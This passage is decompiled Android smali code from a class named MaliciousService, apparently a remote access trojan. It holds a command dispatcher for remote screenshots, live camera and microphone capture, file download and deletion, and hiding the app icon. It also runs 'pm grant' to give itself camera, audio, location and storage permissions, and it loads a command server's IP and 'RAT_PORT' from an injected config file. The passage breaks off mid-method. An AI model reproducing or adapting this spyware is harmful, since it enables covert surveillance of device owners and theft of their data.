    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 733
    :goto_88
    return-void
.end method

.method private downloadFile()V
    .registers 8

    .line 681
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->allPermissionsGranted()Z

    move-result v0

    const-string v1, "MaliciousService"

    if-nez v0, :cond_11

    .line 682
    const-string v0, "Cannot download file: Permissions not granted."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 683
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->checkAndRequestPermissions()V

    .line 684
    return-void

    .line 686
    :cond_11
    const-string v0, "Simulating file download..."

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 687
    const-string v0, "http://example.com/dummy.txt"

    .line 688
    nop

    .line 689
    new-instance v2, Ljava/io/File;

    sget-object v3, Landroid/os/Environment;->DIRECTORY_DOWNLOADS:Ljava/lang/String;

    invoke-static {v3}, Landroid/os/Environment;->getExternalStoragePublicDirectory(Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    const-string v4, "downloaded_sample.txt"

    invoke-direct {v2, v3, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    .line 691
    :try_start_26
    new-instance v3, Ljava/net/URL;

    invoke-direct {v3, v0}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 692
    invoke-virtual {v3}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v0

    check-cast v0, Ljava/net/HttpURLConnection;

    .line 693
    const/16 v3, 0x2710

    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 694
    invoke-virtual {v0, v3}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 695
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->connect()V

    .line 696
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v3

    .line 697
    const/16 v4, 0xc8

    if-ne v3, v4, :cond_96

    .line 698
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v0
    :try_end_48
    .catch Ljava/io/IOException; {:try_start_26 .. :try_end_48} :catch_ad

    .line 699
    :try_start_48
    new-instance v3, Ljava/io/FileOutputStream;

    invoke-direct {v3, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_4d
    .catchall {:try_start_48 .. :try_end_4d} :catchall_8a

    .line 700
    const/16 v4, 0x400

    :try_start_4f
    new-array v4, v4, [B

    .line 702
    :goto_51
    invoke-virtual {v0, v4}, Ljava/io/InputStream;->read([B)I

    move-result v5

    const/4 v6, -0x1

    if-eq v5, v6, :cond_5d

    .line 703
    const/4 v6, 0x0

    invoke-virtual {v3, v4, v6, v5}, Ljava/io/FileOutputStream;->write([BII)V

    goto :goto_51

    .line 705
    :cond_5d
    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "File downloaded successfully: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_77
    .catchall {:try_start_4f .. :try_end_77} :catchall_80

    .line 706
    :try_start_77
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_7a
    .catchall {:try_start_77 .. :try_end_7a} :catchall_8a

    if-eqz v0, :cond_7f

    :try_start_7c
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_7f
    .catch Ljava/io/IOException; {:try_start_7c .. :try_end_7f} :catch_ad

    .line 698
    :cond_7f
    goto :goto_ac

    :catchall_80
    move-exception v2

    :try_start_81
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_84
    .catchall {:try_start_81 .. :try_end_84} :catchall_85

    goto :goto_89

    :catchall_85
    move-exception v3

    :try_start_86
    invoke-static {v2, v3}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :goto_89
    throw v2
    :try_end_8a
    .catchall {:try_start_86 .. :try_end_8a} :catchall_8a

    :catchall_8a
    move-exception v2

    if-eqz v0, :cond_95

    :try_start_8d
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_90
    .catchall {:try_start_8d .. :try_end_90} :catchall_91

    goto :goto_95

    :catchall_91
    move-exception v0

    :try_start_92
    invoke-static {v2, v0}, Lcom/example/android/MaliciousService$$ExternalSyntheticBackport0;->m(Ljava/lang/Throwable;Ljava/lang/Throwable;)V

    :cond_95
    :goto_95
    throw v2

    .line 708
    :cond_96
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Failed to download file. Response code: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_ac
    .catch Ljava/io/IOException; {:try_start_92 .. :try_end_ac} :catch_ad

    .line 712
    :goto_ac
    goto :goto_c8

    .line 710
    :catch_ad
    move-exception v0

    .line 711
    invoke-virtual {v0}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error downloading file: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 713
    :goto_c8
    return-void
.end method

.method private executeCommand(Ljava/lang/String;)V
    .registers 8

    .line 580
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Executing command: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 581
    const-string v0, "SET_SERVER_CONFIG:"

    invoke-virtual {p1, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    const/4 v2, 0x2

    const/4 v3, 0x1

    const/4 v4, 0x3

    if-eqz v0, :cond_52

    .line 582
    const-string v0, ":"

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 583
    array-length v5, v0

    if-ne v5, v4, :cond_3a

    .line 584
    aget-object p1, v0, v3

    .line 585
    aget-object v0, v0, v2

    .line 586
    invoke-direct {p0, p1, v0}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;)V

    .line 587
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->loadServerConfigFromPreferences()V

    .line 588
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->registerDeviceWithServer()V

    .line 589
    goto :goto_50

    .line 590
    :cond_3a
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Invalid SET_SERVER_CONFIG format: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 592
    :goto_50
    goto/16 :goto_124

    .line 593
    :cond_52
    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    sparse-switch v0, :sswitch_data_126

    :cond_59
    goto :goto_b4

    :sswitch_5a
    const-string v0, "DELETE_FILE"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    goto :goto_b5

    :sswitch_63
    const-string v0, "SHOW_ICON"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/16 v2, 0x8

    goto :goto_b5

    :sswitch_6e
    const-string v0, "SCREENSHOT"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x0

    goto :goto_b5

    :sswitch_78
    const-string v0, "HIDE_ICON"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x7

    goto :goto_b5

    :sswitch_82
    const-string v0, "LIVE_CAMERA"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x3

    goto :goto_b5

    :sswitch_8c
    const-string v0, "DOWNLOAD_FILE"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x1

    goto :goto_b5

    :sswitch_96
    const-string v0, "STOP_CAMERA"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x5

    goto :goto_b5

    :sswitch_a0
    const-string v0, "STOP_MIC"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x6

    goto :goto_b5

    :sswitch_aa
    const-string v0, "LIVE_MIC"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_59

    const/4 v2, 0x4

    goto :goto_b5

    :goto_b4
    const/4 v2, -0x1

    :goto_b5
    packed-switch v2, :pswitch_data_14c

    .line 643
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Unknown command: "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v1, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_124

    .line 640
    :pswitch_cf
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->showIcon()V

    .line 641
    goto :goto_124

    .line 637
    :pswitch_d3
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->hideIcon()V

    .line 638
    goto :goto_124

    .line 631
    :pswitch_d7
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda7;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda7;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 635
    goto :goto_124

    .line 625
    :pswitch_e2
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda6;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda6;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 629
    goto :goto_124

    .line 619
    :pswitch_ed
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda5;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda5;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 623
    goto :goto_124

    .line 613
    :pswitch_f8
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda4;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda4;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 617
    goto :goto_124

    .line 607
    :pswitch_103
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda3;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda3;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 611
    goto :goto_124

    .line 601
    :pswitch_10e
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda2;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda2;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 605
    goto :goto_124

    .line 595
    :pswitch_119
    iget-object p1, p0, Lcom/example/android/MaliciousService;->executorService:Ljava/util/concurrent/ExecutorService;

    new-instance v0, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda1;

    invoke-direct {v0, p0}, Lcom/example/android/MaliciousService$$ExternalSyntheticLambda1;-><init>(Lcom/example/android/MaliciousService;)V

    invoke-interface {p1, v0}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 599
    nop

    .line 646
    :goto_124
    return-void

    nop

    :sswitch_data_126
    .sparse-switch
        -0x7cc653ac -> :sswitch_aa
        -0x6b107796 -> :sswitch_a0
        -0x42c7f1fe -> :sswitch_96
        -0x429efd2d -> :sswitch_8c
        -0x3cfe9628 -> :sswitch_82
        -0x2547eeaa -> :sswitch_78
        0x4177166 -> :sswitch_6e
        0x3663707b -> :sswitch_63
        0x3f327f90 -> :sswitch_5a
    .end sparse-switch

    :pswitch_data_14c
    .packed-switch 0x0
        :pswitch_119
        :pswitch_10e
        :pswitch_103
        :pswitch_f8
        :pswitch_ed
        :pswitch_e2
        :pswitch_d7
        :pswitch_d3
        :pswitch_cf
    .end packed-switch
.end method

.method private getRequiredPermissions()[Ljava/lang/String;
    .registers 4

    .line 288
    const/4 v0, 0x6

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "android.permission.ACCESS_FINE_LOCATION"

    aput-object v2, v0, v1

    const/4 v1, 0x1

    const-string v2, "android.permission.ACCESS_COARSE_LOCATION"

    aput-object v2, v0, v1

    const/4 v1, 0x2

    const-string v2, "android.permission.WRITE_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x3

    const-string v2, "android.permission.READ_EXTERNAL_STORAGE"

    aput-object v2, v0, v1

    const/4 v1, 0x4

    const-string v2, "android.permission.RECORD_AUDIO"

    aput-object v2, v0, v1

    const/4 v1, 0x5

    const-string v2, "android.permission.CAMERA"

    aput-object v2, v0, v1

    return-object v0
.end method

.method private grantPermissions()V
    .registers 9

    .line 312
    :try_start_0
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageName()Ljava/lang/String;

    move-result-object v0

    .line 313
    invoke-direct {p0}, Lcom/example/android/MaliciousService;->getRequiredPermissions()[Ljava/lang/String;

    move-result-object v1

    array-length v2, v1

    const/4 v3, 0x0

    :goto_a
    if-ge v3, v2, :cond_35

    aget-object v4, v1, v3

    .line 314
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "pm grant "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_32} :catch_36

    .line 313
    add-int/lit8 v3, v3, 0x1

    goto :goto_a

    .line 318
    :cond_35
    goto :goto_53

    .line 316
    :catch_36
    move-exception v0

    .line 317
    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Grant permissions error: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "MaliciousService"

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 319
    :goto_53
    return-void
.end method

.method private hideIcon()V
    .registers 5

    .line 806
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    .line 807
    new-instance v1, Landroid/content/ComponentName;

    const-string v2, "com.example.android.MainActivity"

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    .line 808
    const/4 v2, 0x2

    const/4 v3, 0x1

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/pm/PackageManager;->setComponentEnabledSetting(Landroid/content/ComponentName;II)V

    .line 809
    const-string v0, "MaliciousService"

    const-string v1, "App icon hidden."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 810
    return-void
.end method

.method private initializeUniqueDeviceId()V
    .registers 5

    .line 215
    const-string v0, "RAT_DEVICE_PREFS"

    const/4 v1, 0x0

    invoke-virtual {p0, v0, v1}, Lcom/example/android/MaliciousService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 216
    const/4 v1, 0x0

    const-string v2, "device_id"

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    .line 217
    const-string v3, "MaliciousService"

    if-eqz v1, :cond_34

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-eqz v1, :cond_1b

    goto :goto_34

    .line 224
    :cond_1b
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Loaded existing unique device ID: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_63

    .line 218
    :cond_34
    :goto_34
    invoke-static {}, Ljava/util/UUID;->randomUUID()Ljava/util/UUID;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    .line 219
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 220
    iget-object v1, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    invoke-interface {v0, v2, v1}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 221
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->apply()V

    .line 222
    iget-object v0, p0, Lcom/example/android/MaliciousService;->uniqueDeviceId:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Generated and saved new unique device ID: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 223
    nop

    .line 226
    :goto_63
    return-void
.end method

.method private injectConfigFromAssets()V
    .registers 7

    .line 266
    const-string v0, "MaliciousService"

    :try_start_2
    invoke-virtual {p0}, Lcom/example/android/MaliciousService;->getAssets()Landroid/content/res/AssetManager;

    move-result-object v1

    const-string v2, "config.ini"

    invoke-virtual {v1, v2}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;

    move-result-object v1

    .line 267
    new-instance v2, Ljava/util/Properties;

    invoke-direct {v2}, Ljava/util/Properties;-><init>()V

    .line 268
    invoke-virtual {v2, v1}, Ljava/util/Properties;->load(Ljava/io/InputStream;)V

    .line 269
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 270
    const-string v1, "SERVER_IP"

    invoke-virtual {v2, v1}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 271
    const-string v3, "FLASK_PORT"

    invoke-virtual {v2, v3}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 272
    const-string v4, "RAT_PORT"

    invoke-virtual {v2, v4}, Ljava/util/Properties;->getProperty(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 274
    if-eqz v1, :cond_67

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_67

    if-eqz v3, :cond_67

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_67

    .line 275
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Config injected from assets/config.ini: IP="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ", Flask Port="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, ", RAT Port="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v0, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 276
    invoke-direct {p0, v1, v3, v2}, Lcom/example/android/MaliciousService;->saveServerConfigToPreferences(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_a4

    .line 278
    :cond_67
    const-string v1, "Injected config.ini found but IP/Flask Port are missing or empty."

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6c
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_6c} :catch_89
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_6c} :catch_6d

    goto :goto_a4

    .line 282
    :catch_6d
    move-exception v1

    .line 283
    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Error processing injected config from assets: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_a5

    .line 280
    :catch_89
    move-exception v1

    .line 281
    invoke-virtual {v1}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "config.ini not found in assets, or error reading it: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 284
    :goto_a4
    nop

    .line 285
    :goto_a5
    return-void
.end method

.method private synthetic lambda$executeCommand$0()Ljava/lang/Void;
    .registers 2
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Exception;
        }
    .end annotation

    .line 596
